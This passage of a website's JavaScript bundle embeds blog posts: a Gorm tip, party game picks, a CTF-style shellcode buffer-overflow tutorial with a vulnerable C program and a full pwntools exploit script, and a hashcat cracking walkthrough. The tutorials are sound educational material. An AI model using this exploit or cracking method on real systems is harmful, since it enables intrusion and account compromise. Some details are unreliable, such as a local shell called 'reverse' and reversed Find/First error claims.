users.id&quot;).Scan(&amp;results)SessionJoins and\xa0PreloadOne of the most useful feature of Gorm is the automatically management of relations. The functions \u201cPreload\u201d and \u201cJoin\u201d help to do this, but when is better to use one or the\xa0other?Joins is optimized for one to one relation and it makes the query faster by directly adding the join to the query. Preload instead can be used in any case, but it first reads all the records and then manually updating the relations in the final\xa0result.db.Preload(&quot;Orders&quot;).Find(&amp;users)db.Joins(&quot;Company&quot;).Joins(&quot;Manager&quot;).Joins(&quot;Account&quot;).First(&amp;user, 1)// You can&#39;t do this!// db.Joins(&quot;Orders&quot;).Find(&amp;users)// because an user can have more than one orderPreloading (Eager Loading)Find and\xa0FirstFind and first are both used to retrieve data, but there is a big difference between them about how they handle errors. By using \u201cFind\u201d, if no value is found an error is raised. Instead, if no rows are retrieved with \u201cFirst\u201d nothing happen. The value returned will be empty and the error\xa0nil.db.First(&amp;user) // an error is raised it the table is emptydb.Limit(1).Find(&amp;user) // no errorQueryAutoMigrate your model to have always the last\xa0versionWhile working on your project it could happen that a new table or column are needed. Take track of new changes can be difficult, but for this case Gorm provides the Migrate function.This function takes in input the model to create new tables and update the database accordingly. The approach is conservative, Gorm only does additions or updates of new functionalities.db.AutoMigrate(&amp;User{}, &amp;Product{}, &amp;Order{})Migration"},{"title":"Ten online party games to play for free with your friends","link":"https://2h3ph3rd.medium.com/ten-online-party-games-to-play-for-free-with-your-friends-b28c3300891e?source=rss-5a9085122896------2","pubDate":"Sat, 15 Oct 2022 07:23:20 GMT","creator":"Francesco Pastore","categories":["games","discord","online","friends","party"],"guid":"https://medium.com/p/b28c3300891e","description":"You are on Discord or at home with your friends and you want to play a game but you don\u2019t have any board game with you. Don\u2019t\xa0worry!Fortunately, there are a lot of online party games that you and your friends can play online for free. You only need a device and an Internet connection.SpyfallYou are FBI detectives but one of you is a spy. Each player has a photo of the round location while the spy has multiple ones. The goal is to find the spy before it founds out the correct location!SpyfallCodenamesCodenames is guessing words game played in two teams. Each team must decide a spymaster while the others are field operative. Only the spymasters know which words their teams must\xa0guess.Codenames - Play with your Friends OnlineHow to play Codenames | Official Rules | UltraBoardGamesTabooAnother two team game about guessing words. This time is the classic Taboo. In each round, one person per team has to help their teammates guess a word without using the \u201ctaboo\u201d ones. The winner is the team who guess more\xa0words.Taboo!Secret HitlerSecret Hitler will make you lie and betray your friends. There are two teams that are chosen randomly by the game. In simple terms, the goal of the \u201cgood\u201d ones is to make a certain number of \u201cgood\u201d policies to pass while the other to elect the dictator. There are a lot of different versions out there, will you be Hitler, Voldemort or Palpatine?Secret Hitler OnlineSecret VoldemortSecret SithSkribblIn Skribbl, like Pictionary, one person per turn has to draw a word and others have to guess it to gain\xa0points.skribbl - Free Multiplayer Drawing &amp; Guessing GameGarticAnother Pictionary like\xa0game.Gartic.io - Draw, Guess, WINGartic PhoneA telephone game in which each user has to draw something written by someone else and make other guessing\xa0it.Gartic Phone - The Telephone GameCoup onlineA peculiar game in which there are multiple influences with different abilities. Each player starts with two of them and their goal is to be the last with at least one influence. See the official rules for more\xa0details.Coup OnlineDecryptrA Decrypto like game in which each team has to guess the coded messages presented to them by other members while cracking the codes they intercept from the opposing\xa0team.DecryptrI hope that you have found some games to play with your\xa0friends.If you know other games that should be added don\u2019t hesitate to write them in the comments!"},{"title":"Basic shellcode exploitation","link":"https://2h3ph3rd.medium.com/basic-shellcode-exploitation-1e9ff274a194?source=rss-5a9085122896------2","pubDate":"Sun, 09 Oct 2022 16:39:44 GMT","creator":"Francesco Pastore","categories":["challenge","shellcode","assembly","binary","ctf"],"guid":"https://medium.com/p/1e9ff274a194","description":"Shellcode is one of the main techniques used in binary challenges, usually to obtain a reverse\xa0shell.In this tutorial we will see what is a shellcode and how to use it by looking to a simple\xa0example.But first there are some questions to\xa0ask.Shellcode, syscall and other awesome\xa0stuffWhat is a shellcode?A shellcode is a sequence of assembly instructions. Usually it is inserted in memory and then executed by exploiting a vulnerability.It is called shellcode because at the beginning it was used only to obtain a shell. Nowadays, shellcode are used to execute whatever sequence of instructions.When is it useful to use a shellcode?A shellcode is useful when you have a vulnerability but nothing to use inside the binary. For example, you could have found a buffer overflow but there isn\u2019t any function to\xa0call.What is it necessary for a shellcode exploit?To write a shellcode you need an executable place in memory and you must know the start address of it. It could be everywhere and the address could be leaked during the execution.Furthermore, you must have a vulnerability that allows the shellcode to be executed.How to obtain a reverse\xa0shell?To obtain a reverse shell is enough to execute an execve\xa0syscall.The path parameter must be a pointer to the binary path that we want to execute like the string /bin/sh\\\\0.int execve(const char *pathname, char *const argv[], char *const envp[]);pathname The path for the executable to be run, usually a pointer to the string `/bin/sh\\\\0`argv Command line parametersenvp Environmental variablesUse man execve to get more\xa0detailsSyscall in\xa0linuxTo understand shellcode it is fundamental know the basics of system calls in\xa0Linux.There are some difference between 32 bit and 64 bit executables. So, always be careful with the version of the binary. An easy way to find out is to used the linux file\xa0utility.In 32 bit the instruction to do a syscall is int\xa00x80.You have to put in the register eax the code of the syscall that you want to\xa0write.The registers ebx, ecx and edx are respectively the first, the second and the third parameter.mov eax, 0xb              # execve code in x86mov ebx, &lt;address of \u201c/bin/sh\\\\0\u201d&gt;mov ecx, 0mov edx, 0int 0x80In 64 bit instead, the instruction to use is\xa0syscall.The register rax is where to put the code, while rdi, rsi and rdx are the register for the parameters.mov rax, 0x3b              # execve code in x64mov rdi, &lt;address of &quot;/bin/sh\\\\0&quot;&gt;mov rsi, 0mov rdx, 0syscallA simple\xa0exampleThe codeAt the end of this article you can find a valid solution and the original\xa0code.#include &lt;stdio.h&gt;void read_buf(char *buf){    printf(&quot;Please write something: &quot;);    read(0, buffer, 0x80); // here there is a buffer overflow    return;}void print_buf(char *buf){    printf(&quot;You write: %s\\\\n&quot;, buf);    return;}void user_input(){    char buf[80];    read_buf(buf);    print_buf(buf);}int main(){    user_input();    return 0;}Here you can find a builded version without protectionsAnalysisFirstly, we have to check for possible vulnerabilities inside the binary. We can see that the code is very straightforward. The program reads something from input and then it writes it on standard\xa0output.By looking carefully we see that the input is managed by a read with a number of bytes equals to 0x80. However, the buffer is long 80 bytes so we have here a buffer overflow vulnerability.The exploitWe can write the shellcode inside the buffer and then use the buffer overflow to overwrite the return address of the function user_input.The goal is to substitute it with the address of the buffer. But first, we have to find out what is this\xa0address.A possible way is to use gdb and look to the stack. The address for the breakpoint can be obtained using the command disass user_input. A good point could be right after the\xa0read.After that, we need only to insert 80 characters and print out the\xa0stack.We can see the saved ebp and saved eip right after the\xa0buffer.Here the final\xa0script#!/bin/python3from pwn import *from pwn import p64p = process(&quot;./shellcode&quot;)buffer_address = 0x7fffffffdf00 # this could change, use gdbshellcode = asm(&quot;&quot;&quot;mov rax, 0x3bmov rdi, 0x%xmov rsi, 0mov rdx, 0syscall&quot;&quot;&quot; % (buffer_address), arch=&#39;amd64&#39;)payload  = b&quot;/bin/sh\\\\0&quot;payload += shellcodepayload  = payload.ljust(80 + 8, b&quot;\\\\x90&quot;)payload += p64(buffer_address + 8)p.recvuntil(b&quot;What&#39;s your name?\\\\n&quot;)p.sendline(payload)p.interactive()As you can see we write a payload of 88 characters: eighty for the dimension of the buffer while the other eight for the saved\xa0ebp.Then we append the address of the buffer that will overwrite the saved eip. Be careful to add eight to the stack address because at the beginning we placed the string /bin/sh\\\\0.Finally, we can run the program and check if everything works.The shellcode works and we have obtained a reverse\xa0shell.Some final\xa0thoughtsIn this example we had more than enough space for our shellcode. Beware that sometimes you could have small space available. Instead to directly call an exec, you could start by calling a read to write more on the\xa0memory.After this basic tutorial, it should be simpler to start using shellcode exploits.Feel free to write your doubts or suggestions about this\xa0article."},{"title":"Basic password cracking with hashcat","link":"https://2h3ph3rd.medium.com/basic-password-cracking-with-hashcat-cac4a5e6fb24?source=rss-5a9085122896------2","pubDate":"Sat, 19 Feb 2022 17:02:43 GMT","creator":"Francesco Pastore","categories":["cybersecurity","hashcat","security","password-cracking","basics"],"guid":"https://medium.com/p/cac4a5e6fb24","description":"As a developer, it could be very useful to know how can you test the security of your password hashes. How a hacker could break your hashes? In how much time he could get all the passwords in plain\xa0text?There are a lot of different ways to do it, in this article we will use the hashcat command\xa0utility.Wait, what type of hash is\xa0it?I can be sure that you know what type of hash your application uses, but how can a hacker identify it\xa0fastly?There are very simple tools to use, like a pip package called\xa0hashid.# you need python3 already installedpip install hashidhashid &lt;hash&gt;Once installed, it can identify what type of hash could be based on multiple factors like the string length or the characters used.Below we can see different hashes of the same string \u201cpassword\u201d:# MD55f4dcc3b5aa765d61d8327deb882cf99# LME52CAC67419A9A224A3B108F3FA6CB6D# SHA15baa61e4c9b93f3f0682250b6cf8331b7ee68fd8# SHA25e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8These are the results for the hashid analysis of the first\xa0hash:You can see MD5 in the top\xa0resultsNow I know the hash algorithm, so\xa0what?Now that we know the hash algorithm it is easier for us to do brute force cracking by generating all possible password combinations.Wait, testing all possible passwords could require a very long time. If you check only the 26 minuscule letters, a password with 10 characters means 26\xb9\u2070 = 1,411670957\xd710\xb9\u2074 possible combinations!In each position, we can have 26 possible characters (considering only the minuscule Latin\xa0letters)Fortunately, most people use passwords simple to remember like birthday or anniversary dates, relatives\u2019 names, or film/videogames/tv characters like \u201cpikachu\u201d or \u201cbrucelee\u201d.Hashcat can work with regex and pattern generation to start the cracking only with the most common password.Password listsOne of the most commonly used password lists is the RockYou\xa0list.You can find it easily on the internet or already downloaded on the most common security distro like Kali or\xa0Parrot.Even using this list could require a long time, mainly when also the hashing algorithm is complex and with a slower execution.For this reason, exists smaller collections of RockYou with only the most common password based on popularity.Rockyou list on Kali\xa0LinuxSome cracking\xa0attemptsNow we have the hash and a password list, also we know the type of hash and which tool to use. We can start the cracking!We need to specify the hashcat mode that corresponds to the hash algorithm to\xa0use.We can easily find it by searching in the help output with a grep command followed by the hash\xa0name.Searching for MD5\xa0modeAfter specifying the mode, we only need to write the hash and a wordlist, then hashcat will do its work. That\u2019s\xa0it!# on kali linux /usr/share/wordlists/rockyou.txthashcat -m 0 bdc87b9c894da5168059e00ebffb9077 path/to/wordlists/rockyou.txtHashcat result for the first hash, mode md5, and password list rockyou.txtI hope that this brief tutorial helps you to understand the basics of password cracking. Don\u2019t hesitate to write in comments your thoughts or\xa0doubts!"}]}}');function b(e){let{item:t}=e;return h.createElement("a",{href:t.link,target:"_blank",class:"nolink"},h.createElement("div",{class:"card shadow--tl zoom"},h.createElement("div",{class:"card__body"},h.createElement("div",{class:"container-fluid"},h.createElement("div",{class:"row"},h.createElement("div",{class:"col"},h.createElement("h3",null,t.title),h.createElement("p",null,function(e){let t=e;return null!=t&&t.length>320&&(t=t.substring(0,320)+"..."),t}(t.description))))))))}function w(){let e=y.C.ev;return e=e.slice(0,6),h.createElement("div",{class:"container"},h.createElement("div",{class:"row padding-bottom--lg"},h.createElement("h1",{className:g.title},"Latest articles")),e.map(((e,t)=>h.createElement("div",{class:"row margin-bottom--lg margin-horiz--sm"},h.createElement(b,{idx:t,item:e})))))}function M(){const{siteConfig:e}=(0,r.Z)();return h.createElement(i.Z,null,h.createElement(p,null),h.createElement("main",null,h.createElement(d,null),h.createElement(w,null)))}}}]);